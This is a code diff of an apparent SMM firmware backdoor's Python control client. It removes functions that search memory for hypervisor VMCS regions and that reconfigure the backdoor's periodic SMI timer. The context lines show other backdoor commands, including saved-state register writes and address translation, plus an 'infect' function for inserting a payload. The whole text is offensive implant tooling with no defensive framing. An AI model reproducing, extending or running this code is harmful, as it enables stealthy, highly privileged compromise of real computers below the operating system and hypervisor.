@@ -25,8 +25,6 @@ BACKDOOR_CTL_STATE_SET      = 0x0a  # set saved state register value
 BACKDOOR_CTL_GET_PHYS_ADDR  = 0x0b  # translate virtual address to physical
 BACKDOOR_CTL_TIMER_ENABLE   = 0x0c  # enable periodic timer software SMI
 BACKDOOR_CTL_TIMER_DISABLE  = 0x0d  # disable periodic timer software SMI
-BACKDOOR_CTL_FIND_VMCS      = 0x0e  # find potential VMCS region
-BACKDOOR_CTL_TIMER_RECONFIG = 0x0f  # change periodic timer tick interval
 
 #
 # Magic register values to communicate with the backdoor using
@@ -620,14 +618,6 @@ class BackdoorControl(object):
         # disable periodic timer SW SMI
         self._ctl_send_smi(BACKDOOR_CTL_TIMER_DISABLE, 0)
 
-    def timer_reconfig(self, interval = 0):
-
-        # set input arguments
-        self._ctl_set('QQ', self.STATUS_NONE, interval)
-
-        # perform request
-        assert self._ctl_send(BACKDOOR_CTL_TIMER_RECONFIG) == 0
-
     def get_phys_addr(self, addr_virt, cr3 = 0, eptp = 0):
 
         eptp = 1 if eptp is None else eptp
@@ -644,21 +634,6 @@ class BackdoorControl(object):
         _, addr_phys = self._ctl_get('QQ')
 
         return addr_phys
-
-    def find_vmcs(self, addr, size = None):
-
-        # set input arguments
-        self._ctl_set('QQQQ', self.STATUS_NONE, addr, PAGE_SIZE if size is None else size, 0)
-
-        # perform request
-        if self._ctl_send(BACKDOOR_CTL_FIND_VMCS) != 0:
-
-            # unable to locate VMCS within specified memory region
-            return None
-
-        _, _, vmcs_addr = self._ctl_get('QQQ')
-
-        return vmcs_addr if vmcs_addr != 0 else None
 
 
 def infect(src, payload, dst = None):
@@ -971,13 +946,6 @@ def get_phys_addr(addr_virt, cr3 = 0, eptp = 0):
     bd = BackdoorControl(cs)
 
     return bd.get_phys_addr(addr_virt, cr3 = cr3, eptp = eptp)
-
-
-def find_vmcs(addr, size = None):
-
-    bd = BackdoorControl(cs)
-
-    return bd.find_vmcs(addr, size = size)
 
 
 def smram_info():
